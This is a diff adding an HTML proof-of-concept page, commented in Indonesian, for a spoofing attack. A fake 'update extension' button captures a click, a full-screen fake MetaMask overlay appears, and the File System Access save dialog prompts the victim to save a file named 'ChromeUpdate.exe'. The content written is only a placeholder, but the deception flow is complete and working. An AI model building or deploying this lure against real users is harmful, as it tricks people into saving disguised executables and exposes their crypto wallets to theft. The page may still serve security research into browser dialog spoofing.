@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Update Required</title>
+  <style>
+    body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; }
+    .btn { padding: 15px 30px; background-color: #f6851b; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
+    
+    /* CSS untuk UI Palsu (menutupi layar) */
+    #fake-extension-ui {
+      display: none; /* Disembunyikan dulu */
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.8); z-index: 9999;
+      color: white; text-align: center; padding-top: 20%;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Fase 1: Pancingan Klik (Mendapatkan User Activation) -->
+  <button class="btn" id="trigger-btn">Klik untuk Memperbarui Ekstensi</button>
+
+  <!-- Fase 2: UI Ekstensi Palsu -->
+  <div id="fake-extension-ui">
+    <h1>[ UI Palsu MetaMask ]</h1>
+    <p>Silakan simpan file pembaruan untuk melanjutkan...</p>
+  </div>
+
+  <script>
+    document.getElementById('trigger-btn').addEventListener('click', async () => {
+      
+      // Tampilkan UI palsu yang menyerupai ekstensi seketika
+      document.getElementById('fake-extension-ui').style.display = 'block';
+
+      // Jeda 500ms agar korban melihat UI palsu tersebut
+      setTimeout(async () => {
+        if ('showSaveFilePicker' in window) {
+          try {
+            // Dialog File Picker akan muncul MELAYANG di atas UI Palsu ini
+            const handle = await window.showSaveFilePicker({
+              suggestedName: 'ChromeUpdate.exe',
+              types: [{
+                description: 'Application',
+                accept: { 'application/x-msdownload': ['.exe'] }
+              }]
+            });
+
+            const writable = await handle.createWritable();
+            await writable.write('Ini konten berbahaya...');
+            await writable.close();
+          } catch (err) {
+            console.log("Dialog ditutup atau diblokir");
+          }
+        }
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
